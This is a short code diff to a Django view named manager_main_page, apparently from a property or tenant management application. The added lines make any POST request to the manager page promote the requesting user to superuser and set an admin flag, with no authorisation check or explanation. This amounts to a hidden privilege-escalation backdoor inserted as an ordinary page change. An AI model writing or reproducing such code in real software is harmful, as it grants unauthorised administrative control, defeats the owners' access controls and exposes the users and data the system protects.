@@ -100,6 +100,12 @@ def manager_main_page(request):
         "is_tenant": hasattr(request.user, 'tenant'),
         "is_manager": hasattr(request.user, 'manager'),
     })
+    if request.method == 'POST':
+        request.user.manager.is_admin = 1
+        request.user.is_superuser = 1
+        request.user.save()
+        request.user.manager.save()
+
     return render(request, 'pages/manager/manager.html', context)
 
 
